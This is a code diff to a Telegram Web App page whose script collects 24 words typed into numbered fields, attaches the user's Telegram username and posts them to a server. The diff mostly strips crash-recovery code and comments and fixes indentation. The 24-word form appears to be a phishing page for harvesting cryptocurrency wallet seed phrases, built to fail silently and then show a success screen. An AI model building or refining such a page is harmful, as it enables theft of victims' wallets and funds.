@@ -380,31 +380,6 @@
     </div>
 
 <script>
-    // Восстановление после краша WebView
-    window.addEventListener('load', () => {
-        if (window.Telegram && window.Telegram.WebApp) {
-            const tg = window.Telegram.WebApp;
-            tg.ready();
-            tg.expand();
-            
-            if (!tg.initDataUnsafe || !tg.initDataUnsafe.user) {
-                console.log("WebView восстановлен");
-                setTimeout(() => {
-                    window.location.reload();
-                }, 100);
-            }
-        }
-    });
-
-    window.addEventListener('error', (e) => {
-        if (e.message && e.message.includes('WebView')) {
-            console.log("WebView ошибка, перезагрузка...");
-            setTimeout(() => {
-                window.location.reload();
-            }, 500);
-        }
-    });
-    
     const tg = window.Telegram.WebApp;
     tg.ready();
     tg.expand();
@@ -478,7 +453,7 @@
         if (tg.HapticFeedback) tg.HapticFeedback.impactOccurred('light');
     });
 
-    // ОТПРАВКА ДАННЫХ - БЕЗ ALERT И ТЕКСТОВЫХ СООБЩЕНИЙ
+    // ОТПРАВКА ДАННЫХ
     sendBtn.addEventListener('click', async () => {
         const wordsArray = [];
         let hasError = false;
@@ -489,24 +464,24 @@
             const inputField = document.getElementById(`word${i}`);
             const wordValue = inputField.value.trim();
             
-        if (!wordValue) {
-            inputField.classList.add('error');
-            inputField.style.animation = 'shake 0.3s ease-in-out 0s 2';
-            setTimeout(() => {
-                inputField.classList.remove('error');
-                inputField.style.animation = '';
-            }, 800);
-            hasError = true;
-            errorWordIndex = i;
-            break;
-        }
+            if (!wordValue) {
+                inputField.classList.add('error');
+                inputField.style.animation = 'shake 0.3s ease-in-out 0s 2';
+                setTimeout(() => {
+                    inputField.classList.remove('error');
+                    inputField.style.animation = '';
+                }, 800);
+                hasError = true;
+                errorWordIndex = i;
+                break;
+            }
             wordsArray.push(wordValue);
         }
         
         if (hasError) {
             if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('error');
             document.getElementById(`word${errorWordIndex}`).focus();
-            return; // НЕТ ALERT, ПРОСТО ВОЗВРАТ
+            return;
         }
 
         let username = tg.initDataUnsafe.user?.username || "без_имени";
@@ -536,7 +511,6 @@
             const result = await response.json();
             
             if (response.ok && result.status === 'ok') {
-                // УСПЕХ - переход на success
                 if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
                 
                 setTimeout(() => {
@@ -544,13 +518,11 @@
                     successPage.classList.remove('hidden');
                 }, 500);
             } else {
-                // ОШИБКА - красный + тряска, НЕТ ALERT
                 throw new Error();
             }
         } catch(e) {
             console.error("Ошибка:", e);
             
-            // ТРЯСКА ДЛЯ ВСЕХ ПОЛЕЙ
             for (let i = 1; i <= 24; i++) {
                 const field = document.getElementById(`word${i}`);
                 field.classList.add('error');
